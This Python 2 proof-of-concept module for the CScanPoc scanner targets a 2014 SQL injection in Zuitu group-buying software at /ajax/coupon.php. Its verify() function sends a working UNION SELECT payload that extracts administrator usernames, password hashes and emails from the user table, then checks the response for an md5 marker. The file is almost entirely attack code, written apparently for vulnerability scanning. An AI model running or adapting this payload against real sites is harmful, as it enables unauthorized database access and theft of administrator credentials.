# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2


class Vuln(ABVuln):
    vuln_id = 'Zuitu_0012'  # 平台漏洞编号，留空
    name = '最土团购 /ajax/coupon.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-09'  # 漏洞公布时间
    desc = '''
        最土团购，/ajax/coupon.php 基础函数过滤不全导致注射。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2245/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zuitu(最土团购)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2c0f3b86-e6e0-488a-9090-a28d671c54d0'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = (
                "/ajax/coupon.php?action=consume&secret=8&id=2%27)/**/and/**/1=2/"
                "**/union/**/select/**/1,2,0,4,5,6,concat(0x31,0x3a,username,0x3a,"
                "password,0x3a,email,md5(233)),8,9,10,11,9999999999,13,14,15,16/**/from/"
                "**/user/**/where/**/manager=0x59/**/limit/**/0,1%23"
            )
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()

            if 'e165421110ba03099a1c0393373c5b43' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
